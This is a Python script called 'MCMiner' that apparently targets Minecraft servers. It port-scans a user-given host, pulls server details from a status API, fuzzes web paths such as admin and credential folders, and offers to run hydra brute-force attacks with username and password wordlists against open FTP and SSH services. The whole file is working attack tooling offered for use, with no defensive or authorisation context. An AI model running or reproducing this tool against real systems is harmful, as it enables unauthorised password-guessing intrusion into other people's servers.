import socket
from colorama import Fore, init
import requests
import os
import threading
import time

Fore.LR = Fore.LIGHTRED_EX
Fore.LG = Fore.LIGHTGREEN_EX
Fore.W = Fore.LIGHTWHITE_EX
Fore.B = Fore.BLUE
Fore.LB = Fore.LIGHTBLUE_EX
Fore.R = Fore.RESET
Fore.Y = Fore.YELLOW
Fore.LBEX = Fore.LIGHTBLACK_EX
Fore.LWEX = Fore.LIGHTWHITE_EX

init()

folders_and_files = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/',
                     'robots.txt', 'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/',
                     'Login/',
                     'Register/', 'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/',
                     'minecraft/', 'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/',
                     'admin/', 'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']

TryFTP = False
TrySSH = False
ScrapeWeb = False

os.system('title MCMiner by wfsec')

print(f'''

{Fore.LG}        
{Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
{Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
{Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
{Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
{Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
{Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
''')
print('')
ip = input('            IP: ')

server_ip = socket.gethostbyname(ip)

print('')
print('')

global proto, s
ports = [21, 22, 23, 53, 80, 443, 3389, 8080, 19312, 25565]

for x in ports:
    if x == 21:
        proto = 'FTP'
    elif x == 22:
        proto = 'SSH'
    elif x == 23:
        proto = 'TELNET'
    elif x == 53:
        proto = 'DNS'
    elif x == 80:
        proto = 'HTTP'
    elif x == 443:
        proto = 'HTTPS'
    elif x == 3389:
        proto = 'RDP'
    elif x == 8080:
        proto = 'ALT HTTP'
    elif x == 19312:
        proto = 'Bedrock'
    elif x == 25565:
        proto = 'Java'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)  # If host does not react after 3 seconds, it closes
    result = s.connect_ex((ip, x))
    if result == 0:
        if x == 21:
            TryFTP = True
        if x == 22:
            TrySSH = True
        if x == 80:
            ScrapeWeb = True
        print(f'{Fore.LG}       [+]{Fore.W} Port {x} is open on [{ip}] {Fore.YELLOW}[{x}/{proto}]{Fore.W}')
        s.close()
    else:
        print(f'{Fore.LR}       [-]{Fore.W} Port {x} is closed on [{ip}] {Fore.YELLOW}[{x}/{proto}]{Fore.W}')
        s.close()

theurl = f'https://api.mcsrvstat.us/2/{ip}'
r = requests.get(theurl)
data = r.text

print('')

SRV = r.json().get("srv")
SERVER_IP = r.json().get("ip")
ONLINE_MODE = r.json().get("online")
VERSION = r.json().get("version")
QUERY = r.json().get("query")

print(f'''
            {Fore.RED}Query:{Fore.R} {QUERY}
            {Fore.RED}Version:{Fore.R} {VERSION}
            {Fore.RED}Online Mode:{Fore.R} {ONLINE_MODE}
            {Fore.RED}Server IP:{Fore.R} {SERVER_IP}
            {Fore.RED}SRV:{Fore.R} {SRV}
''')


def fuzz(dir):
    global fuzz_url, r, meaning, color
    fuzz_url = f'http://{ip}/{dir}'
    r = requests.get(fuzz_url, headers=user_agent)
    status = r.status_code
    if status == 200:
        meaning = '[OK]'
        color = Fore.LIGHTGREEN_EX
    elif status == 403:
        meaning = '[Forbidden]'
        color = Fore.LIGHTRED_EX
    elif status == 404:
        meaning = '[Not Found]'
        color = Fore.LIGHTRED_EX
    elif status == 429:
        meaning = '[Too Many Requests]'
        color = Fore.LIGHTYELLOW_EX
    print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')


def threads_thing():
    for dir in folders_and_files:
        fuzzThread = threading.Thread(target=fuzz, args=(dir,), daemon=True)  # Starts the fuzzing thread
        time.sleep(1)
        fuzzThread.start()


if ScrapeWeb:
    WebASK = input('            Do you want to information about website? y/n: ')
    if WebASK == 'y':
        user_agent = {
            'User-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1'}
        r = requests.get(f'http://{ip}', headers=user_agent)
        print('')
        for res in r.history:
            print(f'            {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')
        d = requests.head(f'http://{ip}', headers=user_agent)
        print(f'''
            {Fore.LB}Server:{Fore.W} {d.headers["server"]}
            {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
        ''')
        print('')
        fuzzask = input('            Do you want to fuzz the site? y/n: ')
        if fuzzask == 'y':
            threads_thing()

        else:
            print('               Ok.')
            pass

if TryFTP:
    print('')
    FTPASK = input('            Do you want to Wordlist attack the FTP? y/n: ')
    if FTPASK == 'y':
        the_proto = 'ftp'
        ftp_username_wordlist = input('             Username Wordlist: ')
        ftp_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                ''')
        pass

if TrySSH:
    print('')
    SSHASK = input('            Do you want to Wordlist attack the SSH? y/n: ')
    if SSHASK == 'y':
        the_proto = 'ssh'
        ssh_username_wordlist = input('             Username Wordlist: ')
        ssh_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                ''')
        pass
